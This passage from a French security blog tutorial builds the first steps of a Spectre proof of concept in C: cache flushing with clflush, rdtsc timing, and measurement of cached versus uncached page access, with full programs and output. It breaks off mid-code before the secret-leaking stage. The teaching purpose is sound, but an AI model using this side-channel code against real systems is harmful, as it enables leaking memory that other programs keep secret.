<!doctype html>
<html lang="fr-fr" class="no-js">

  <head>
    <link href="http://gmpg.org/xfn/11" rel="profile" hreflang="fr">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
  
    <meta name="google-site-verification" content="JeRPv2CEcpONAy8C7dMr1nzjlpZxlxYCtt2PnuQ78g8" />
    <!-- Enable responsiveness on mobile devices-->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  
    <title>
      
        Construction d'un PoC pour Spectre - hackndo
      
    </title>

	<link rel="stylesheet" href="/assets/css/style.css?v=1.13"> <!-- Resource style -->
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Signika:600"> <!-- Logo font -->
    <script src="/assets/js/modernizr.js"></script> <!-- Modernizr -->
    
    <link rel="apple-touch-icon" sizes="57x57" href="/assets/icones/favicon/apple-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="/assets/icones/favicon/apple-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="/assets/icones/favicon/apple-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="/assets/icones/favicon/apple-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="/assets/icones/favicon/apple-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="/assets/icones/favicon/apple-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="/assets/icones/favicon/apple-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="/assets/icones/favicon/apple-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="/assets/icones/favicon/apple-icon-180x180.png">
    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icones/favicon/android-icon-192x192.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/assets/icones/favicon/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="96x96" href="/assets/icones/favicon/favicon-96x96.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/assets/icones/favicon/favicon-16x16.png">
    <link rel="manifest" href="/assets/res/manifest.json">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/assets/icones/favicon/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
  	
	<!-- RSS -->
    <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="hackndo" />

    <!-- Twitter card -->
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:site" content="@hackanddo" />
    <meta name="twitter:creator" content="@hackanddo" />
    <meta name="twitter:title" content="Construction d'un PoC pour Spectre" />
    <meta name="twitter:description" content="Aujourd'hui, nous allons construire une preuve de concept de l'attaque Spectre afin de mettre en pratique la théorie de cette attaque présentée dans l'article précédant." />
    
    <meta name="twitter:image" content="http://localhost:4000/assets/uploads/2018/01/spectre_poc.png" />
    
  
    <!-- Google analytics -->
    <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  
      ga('create', 'UA-80312745-1', 'auto');
      ga('send', 'pageview');
  
    </script>
    <!-- Begin Jekyll SEO tag v2.6.1 -->
<meta name="generator" content="Jekyll v4.0.0" />
<meta property="og:title" content="Construction d’un PoC pour Spectre" />
<meta name="author" content="Pixis" />
<meta property="og:locale" content="fr_FR" />
<meta name="description" content="Aujourd’hui, nous allons construire une preuve de concept de l’attaque Spectre afin de mettre en pratique la théorie de cette attaque présentée dans l’article précédant." />
<meta property="og:description" content="Aujourd’hui, nous allons construire une preuve de concept de l’attaque Spectre afin de mettre en pratique la théorie de cette attaque présentée dans l’article précédant." />
<link rel="canonical" href="http://localhost:4000/construction-poc-spectre/" />
<meta property="og:url" content="http://localhost:4000/construction-poc-spectre/" />
<meta property="og:site_name" content="hackndo" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2018-01-25T23:28:14+01:00" />
<script type="application/ld+json">
{"@type":"BlogPosting","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/icones/logo.png"},"name":"Pixis"},"url":"http://localhost:4000/construction-poc-spectre/","headline":"Construction d’un PoC pour Spectre","dateModified":"2018-01-25T23:28:14+01:00","datePublished":"2018-01-25T23:28:14+01:00","author":{"@type":"Person","name":"Pixis"},"description":"Aujourd’hui, nous allons construire une preuve de concept de l’attaque Spectre afin de mettre en pratique la théorie de cette attaque présentée dans l’article précédant.","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/construction-poc-spectre/"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

</head>

  <body>
    <header class="cd-main-header">
    <a href="/" class="cd-logo"><img src="/assets/icones/logo.png" /> <span class="cd-logo-title">hackndo</span></a>
		
    <a href="#0" class="cd-nav-trigger">Menu<span></span></a>

</header> <!-- .cd-main-header -->
    <main class="cd-main-content">
		<nav class="cd-side-nav">
            <div class="sidebar-about">
    <h1>
        <img id="site-logo" src="/assets/icones/logo.png" alt="logo" title="logo" />
        <a class="sidebar-title" href="/">
        hackndo
        </a>
    </h1>
    <p class="lead">Think out of the box</p>
</div>

<ul>
    <li class="cd-label">Blog</li>
    <li class="">
        <a href="/">Home</a>
    </li>
    
    
        
            
        
    
        
            
                <li class="">
                    <a href="/about/">À propos</a>
                </li>
            
        
    
        
            
                <li class="">
                    <a href="/archives/">Archives</a>
                </li>
            
        
    
        
            
                <li class="">
                    <a href="/contact/">Me contacter</a>
                </li>
            
        
    
        
            
                <li class="">
                    <a href="/disclaimer/">Disclaimer</a>
                </li>
            
        
    
        
    
        
            
        
    
        
            
                <li class="">
                    <a href="/projects/">Projets</a>
                </li>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
    
        
    
</ul>
<ul>
    <li class="cd-label">Liens</li>
    <li><a href="https://www.dailysecurity.fr/" target="_blank">Blog de Geluchat</a></li>
    <li><a href="http://lsdsecdaemon.com" target="_blank">Blog de Th3_l5D</a></li>
    <li><a href="http://inf0sec.fr" target="_blank">Blog de Matthieu</a></li>
</ul>
<p class="sidebar-copyright">&copy; 2019. Tous droits réservés.</p>
<div class="sidebar-social">
<ul>
  <li><a href="https://twitter.com/HackAndDo" title="Twitter" target="_blank"><img alt="Twitter" title="Twitter" src="/assets/icones/social/twitter.png" /></a></li>
  <li><a href="https://github.com/hackndo" title="Github" target="_blank"><img title="Github" alt="Github" src="/assets/icones/social/github.png" /></a></li>
  <li><a href="https://www.youtube.com/channel/UC9WYWHLdu9TK-0Hu3wcHJ9g" title="Youtube" target="_blank"><img title="Youtube" alt="Youtube" src="/assets/icones/social/youtube.png" /></a></li>
  <li><a href="https://discord.gg/9At6SUZ" title="Discord" target="_blank"><img title="Discord" alt="Discord" src="/assets/icones/social/discord.png" /></a></li>
  <li><a href="https://www.linkedin.com/in/romainbentz/" title="LinkedIn" target="_blank"><img title="LinkedIn" alt="LinkedIn" src="/assets/icones/social/linkedin.png" /></a></li>
  <li><a href="https://sh.hackndo.com" title="Shell" target="_blank"><img title="Shell" alt="Shell" src="/assets/icones/social/shell.png" /></a></li>
  <li><a href="/feed.xml" title="RSS" target="_blank"><img title="RSS" alt="RSS" src="/assets/icones/social/rss.png" /></a></li>
  <li><a href="https://ko-fi.com/hackndo" title="Ko-Fi" target="_blank"><img title="Ko-Fi" alt="Ko-Fi" src="/assets/icones/social/kofi.gif" /></a></li>
</ul>
</div>
        </nav>

        <div class="content-wrapper">
            <div class="post">
  
  <div class="post-cover">
    <img src="/assets/uploads/2018/01/spectre_poc.png" alt="Construction d'un PoC pour Spectre" title="Construction d'un PoC pour Spectre" />
  </div>
  
  <h1 class="post-title">Construction d'un PoC pour Spectre</h1>
  <div class="post-info">
      <p class="alignleft">25 Jan 2018 <a class="post-comments-count" href="http://http://localhost:4000/construction-poc-spectre/#disqus_thread"></a></p>
      <p class="alignright">Auteur : <strong><a href="https://twitter.com/HackAndDo">Pixis</a></strong></p>
      <div class="keywords">
        <span class="post-tags"><a href="/archives/#user-land"><i class="fas fa-tags"></i> User Land</a><a href="/archives/#linux"><i class="fas fa-tags"></i> Linux</a><a href="/archives/#hardware"><i class="fas fa-tags"></i> Hardware</a></span>
      </div>
</div>

  <article>
  <p>Aujourd’hui, nous allons construire une preuve de concept (PoC - <em>Proof of Concept</em>) de l’attaque Spectre afin de mettre en pratique la théorie de cette attaque présentée dans l’article <a href="/meltdown-spectre">Meltdown et Spectre</a>.</p>

<p>Cet article nécessite des connaissances dans le langage de programmation C pour pouvoir le suivre.</p>

<!--more-->

<h2 id="introduction">Introduction</h2>

<p>Le développement de cet exemple va se dérouler en quatre parties.</p>

<ol>
  <li>La première va mettre en évidence le temps d’accès à la mémoire vive lorsqu’on accède à des zones mémoires qui ne sont pas dans le cache.</li>
  <li>Nous verrons ensuite la différence de temps d’accès entre une zone mémoire cachée et une non cachée.</li>
  <li>La mise en cache d’une zone mémoire lors de prédiction de branche sera mise en avant.</li>
  <li>Nous finirons en divulguant un secret intrinsèque au programme que nous n’aurions jamais pu découvrir sans utiliser cette technique.</li>
</ol>

<h2 id="poc-de-temps-daccès-à-la-ram">PoC de temps d’accès à la RAM</h2>

<p>La structure du programme évoluera avec les chapitres. Ici, nous allons développer un programme simple qui va initialiser un buffer de 256 pages, le supprimer du cache, et nous allons accéder à toutes les pages de ce buffer en mesurant le nombre de cycles d’horloge qui se sont écoulés avant et après l’accès à chaque zone mémoire.</p>

<p>Le programme aura donc la structure suivante</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Initialisation du buffer de 256 pages */</span>
<span class="kt">char</span> <span class="n">paged_buffer</span><span class="p">[</span><span class="mi">256</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">];</span>

<span class="cm">/* Calcul du temps d'accès à une page du buffer */</span>
<span class="kt">uint32_t</span> <span class="nf">get_index_access_time</span><span class="p">(</span><span class="kt">int</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">flush</span><span class="p">(</span><span class="n">paged_buffer</span><span class="p">[</span><span class="n">value</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">]);</span> <span class="c1">// On supprime la page de tous les niveaux de cache</span>

    <span class="kt">int</span> <span class="n">before</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span> <span class="c1">// Donne le nombre de cycle d'horloge actuel</span>
    <span class="n">access</span><span class="p">(</span><span class="n">paged_buffer</span><span class="p">[</span><span class="n">value</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">]);</span> <span class="c1">// Accès à la zone mémoire</span>
    <span class="kt">int</span> <span class="n">after</span>  <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span> <span class="c1">// Donne le nombre de cycle d'horloge suite à l'accès mémoire</span>
    <span class="k">return</span> <span class="n">after</span> <span class="o">-</span> <span class="n">before</span><span class="p">;</span> <span class="c1">// On retourne la différence pour avoir le temps d'accès</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* Pour toutes les pages du buffer, on calcule le temps d'accès */</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%c: %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">i</span><span class="p">,</span> <span class="n">get_index_access_time</span><span class="p">(</span><span class="n">i</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Ce code simplifié permet de comprendre l’idée que nous cherchons à montrer. Toutes les pages sont supprimées du cache, puis on mesure le nombre de cycles d’horloge nécessaires pour accéder à chacunes de ces pages. L’ordre de grandeur pour accéder à une page en mémoire, c’est 300 cycles d’horloge, tandis que lorsqu’elle est en cache, c’est inférieur à 80 cycles d’horloge.</p>

<p>Le programme complet et fonctionnel va faire une moyenne sur 100 accès, afin d’éviter les faux positifs. Le voici :</p>

<p><strong>poc_no_cache.c</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;x86intrin.h&gt;
</span>
<span class="cp">#define GREEN   "\x1b[32m"
#define RESET   "\x1b[0m"
</span>
<span class="cp">#define PAGE_SIZE 512
#define COUNT 100
</span>
<span class="k">volatile</span> <span class="kt">char</span> <span class="n">paged_buffer</span><span class="p">[</span><span class="mi">256</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">];</span>
<span class="k">volatile</span> <span class="kt">uint32_t</span> <span class="n">paged_buffer_sz</span> <span class="o">=</span> <span class="mi">256</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">access_value</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* Wrapper pour éviter les optimisations */</span>
    <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">x</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint32_t</span> <span class="nf">get_index_access_time</span><span class="p">(</span><span class="kt">int</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">cycle_difference</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">access_time</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">in_ram</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">in_cache</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="cm">/* Récupère l'index de la page à laquelle on accède */</span>
    <span class="n">value</span> <span class="o">*=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
    
    <span class="cm">/* Boucle pour faire une moyenne sur COUNT accès */</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">COUNT</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>

        <span class="cm">/* Vidage du cache */</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">_mm_clflush</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)(</span><span class="n">paged_buffer</span> <span class="o">+</span> <span class="n">j</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="kt">int</span> <span class="n">before</span><span class="p">,</span> <span class="n">after</span><span class="p">;</span>

        <span class="n">before</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span> <span class="c1">// Donne le nombre de cycle d'horloge actuel</span>
        <span class="n">access_value</span><span class="p">(</span><span class="n">paged_buffer</span><span class="p">[</span><span class="n">value</span><span class="p">]);</span> <span class="c1">// Accès à la page</span>
        <span class="n">_mm_lfence</span><span class="p">();</span> <span class="c1">// Permet d'éviter que 'after' soit récupéré avant que 'access_value' ne termine</span>
        <span class="n">after</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span> <span class="c1">// Donne le nombre de cycle d'horloge actuel</span>

        <span class="kt">uint32_t</span> <span class="n">diff</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">after</span><span class="o">-</span><span class="n">before</span><span class="p">);</span> <span class="c1">// Nombre de cycles pour l'accès à la zone mémoire</span>

        <span class="n">access_time</span> <span class="o">+=</span> <span class="n">diff</span><span class="p">;</span>
        
        <span class="cm">/*
         * Si le temps d'accès était supérieur à 80 cycles, alors on considère que la plage mémoire
         * étant dans la RAM
         * Sinon, elle était probablement dans le cache
         */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">diff</span> <span class="o">&gt;</span> <span class="mi">80</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">in_ram</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">in_cache</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="cm">/* S'il y a plus eu de cas en cache qu'en RAM, on ajoute une astérisque verte */</span>
    <span class="k">if</span><span class="p">(</span><span class="n">in_cache</span> <span class="o">&gt;</span> <span class="n">in_ram</span><span class="p">)</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"["</span> <span class="n">GREEN</span> <span class="s">"*"</span> <span class="n">RESET</span> <span class="s">"] "</span><span class="p">);</span>
    <span class="k">else</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[ ] "</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"% 4i % 4i % 5i - "</span><span class="p">,</span> <span class="n">in_cache</span><span class="p">,</span> <span class="n">in_ram</span><span class="p">,</span> <span class="n">access_time</span> <span class="o">/</span> <span class="n">COUNT</span> <span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">in_cache</span> <span class="o">&gt;</span> <span class="n">in_ram</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">get_all_access_time</span><span class="p">()</span> <span class="p">{</span>
    <span class="cm">/*
     * Pour toutes les pages du buffer, on calcule le temps d'accès
     * CACHE : Nombre de fois où le nombre de cycle d'horloge était &lt; à 80
     * MEM : Nombre de fois où le nombre de cycle d'horloge était &gt; à 80
     * CYCLES : Moyenne du nombre de cycle d'horloge pour l'accès
     * HIT : Indique si, en moyenne, on a trouvé que la variable était en cache
     */</span>
    <span class="n">printf</span><span class="p">(</span>
        <span class="s">"    CACHE MEM CYCLES    HIT</span><span class="se">\n</span><span class="s">"</span>
        <span class="s">"---------------------------</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%c: %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">i</span><span class="p">,</span> <span class="n">get_index_access_time</span><span class="p">(</span><span class="n">i</span><span class="p">));</span>
    <span class="p">}</span>

<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">paged_buffer</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">paged_buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="cm">/* Permet d'éviter une optimisation appelée lazy allocation */</span>
    <span class="p">}</span>

    <span class="n">get_all_access_time</span><span class="p">();</span>
    
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Ce programme bien fourni en commentaires est fonctionnel. Voici un aperçu du résultat lorsqu’il est compilé sans optimisation</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pixis@hackndo:~/spectre$ gcc -O0 poc_no_cache.c -o poc_no_cache &amp;&amp; ./poc_no_cache
    CACHE MEM CYCLES    HIT
---------------------------
[...]
[ ]    0  100   291 - o: 0
[ ]    0  100   287 - p: 0
[ ]    1   99   271 - q: 0
[ ]    1   99   272 - r: 0
[ ]    0  100   304 - s: 0
[ ]    0  100   268 - t: 0
[ ]    0  100   272 - u: 0
[ ]    0  100   278 - v: 0
[ ]    0  100   284 - w: 0
[...]
</code></pre></div></div>

<p>Nous voyons que le nombre de cycles d’horloge moyen nécessaires à l’accès d’une page est d’environ 200 ou 300 cycles, et que la grande majorité des essais indiquent que les accès sont en RAM, sauf quelques très rares faux positifs (2 faux positifs pour 900 essais dans l’extrait ci-dessus).</p>

<p>Il est alors temps de mettre en évidence l’apport du cache sur ce type d’accès.</p>

<h2 id="poc-de-mise-en-évidence-de-la-mise-en-cache">PoC de mise en évidence de la mise en cache</h2>

<p>Pour mettre en évidence la mise en cache, nous allons compléter le code simplifié du premier exemple. Nous vidions le cache avant chaque accès en mémoire, tandis que maintenant, nous allons choisir une page mémoire, et après avoir vidé le cache, nous allons accéder à cette page avant de mesurer le temps d’accès. Ainsi, en accédant à cette page, le processeur va la mettre en cache, et le temps d’accès que nous calculerons ensuite sera plus rapide pour cette zone.</p>

<p>Il suffit donc de rajouter un accès mémoire pour un index juste après avoir vidé le cache. Le code minimaliste devient ceci :</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Initialisation du buffer de 256 pages */</span>
<span class="kt">char</span> <span class="n">paged_buffer</span><span class="p">[</span><span class="mi">256</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">];</span>

<span class="cm">/* Calcul du temps d'accès à une page du buffer */</span>
<span class="kt">uint32_t</span> <span class="nf">get_index_access_time</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">int</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">flush</span><span class="p">(</span><span class="n">paged_buffer</span><span class="p">[</span><span class="n">value</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">]);</span> <span class="c1">// On supprime la page de tous les niveaux de cache</span>


    <span class="cm">/* C'est ici que nous ajoutons un accès à un index défini dans main(), 'H' ou 72 dans notre exemple */</span>
    <span class="n">access</span><span class="p">(</span><span class="n">paged_buffer</span><span class="p">[</span><span class="n">idx</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">])</span>

    <span class="kt">int</span> <span class="n">before</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span> <span class="c1">// Donne le nombre de cycle d'horloge actuel</span>
    <span class="n">access</span><span class="p">(</span><span class="n">paged_buffer</span><span class="p">[</span><span class="n">value</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">]);</span> <span class="c1">// Accès à la zone mémoire</span>
    <span class="kt">int</span> <span class="n">after</span>  <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span> <span class="c1">// Donne le nombre de cycle d'horloge suite à l'accès mémoire</span>
    <span class="k">return</span> <span class="n">after</span> <span class="o">-</span> <span class="n">before</span><span class="p">;</span> <span class="c1">// On retourne la différence pour avoir le temps d'accès</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* Pour toutes les pages du buffer, on calcule le temps d'accès */</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* Le premier argument, c'est l'index que nous allons mettre en cache */</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%c: %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">i</span><span class="p">,</span> <span class="n">get_index_access_time</span><span class="p">(</span><span class="sc">'H'</span><span class="p">,</span> <span class="n">i</span><span class="p">));</span> <span class="c1">// 'H' est un char qui correspond à 72 en ASCII</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Si vous avez compris ce code raccourci, cela vous permettra de mieux comprendre la différence entre le programme suivant, et celui que nous avons vu lors de l’absence de mise en cache.</p>

<p><strong>poc_cache.c</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;x86intrin.h&gt;
</span>
<span class="cp">#define GREEN   "\x1b[32m"
#define RESET   "\x1b[0m"
</span>
<span class="cp">#define PAGE_SIZE 512
#define COUNT 100
</span>
<span class="k">volatile</span> <span class="kt">uint8_t</span> <span class="n">paged_buffer</span><span class="p">[</span><span class="mi">256</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">];</span>
<span class="k">volatile</span> <span class="kt">uint32_t</span> <span class="n">paged_buffer_sz</span> <span class="o">=</span> <span class="mi">256</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>


<span class="kt">void</span> <span class="nf">access_value</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* Wrapper pour éviter les optimisations */</span>
    <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">x</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">delay</span><span class="p">()</span> <span class="p">{</span>
    <span class="cm">/* Ne fait rien à part faire passer le temps */</span>
    <span class="kt">uint32_t</span> <span class="n">x</span> <span class="o">=</span> <span class="mh">0x1234</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="k">volatile</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">x</span> <span class="o">*=</span> <span class="n">i</span><span class="p">;</span>
        <span class="n">x</span> <span class="o">^=</span> <span class="mi">123</span><span class="p">;</span>
        <span class="n">x</span> <span class="o">*=</span> <span class="mi">173</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">uint32_t</span> <span class="nf">get_index_access_time</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">int</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">cycle_difference</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">access_time</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">in_ram</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">in_cache</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="cm">/* Récupère l'index de la page à laquelle on accède */</span>
    <span class="n">value</span> <span class="o">*=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
    <span class="n">idx</span> <span class="o">*=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
    
    <span class="cm">/* Boucle pour faire une moyenne sur COUNT accès */</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">COUNT</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>

        <span class="cm">/* Vidage du cache */</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">_mm_clflush</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)(</span><span class="n">paged_buffer</span> <span class="o">+</span> <span class="n">j</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="n">access_value</span><span class="p">(</span><span class="n">paged_buffer</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span> <span class="c1">// Accès à la page</span>

        <span class="cm">/* On s'assure que l'accès est terminé avant de continuer */</span>
        <span class="n">_mm_lfence</span><span class="p">();</span>
        <span class="n">delay</span><span class="p">();</span>

        <span class="kt">int</span> <span class="n">before</span><span class="p">,</span> <span class="n">after</span><span class="p">;</span>

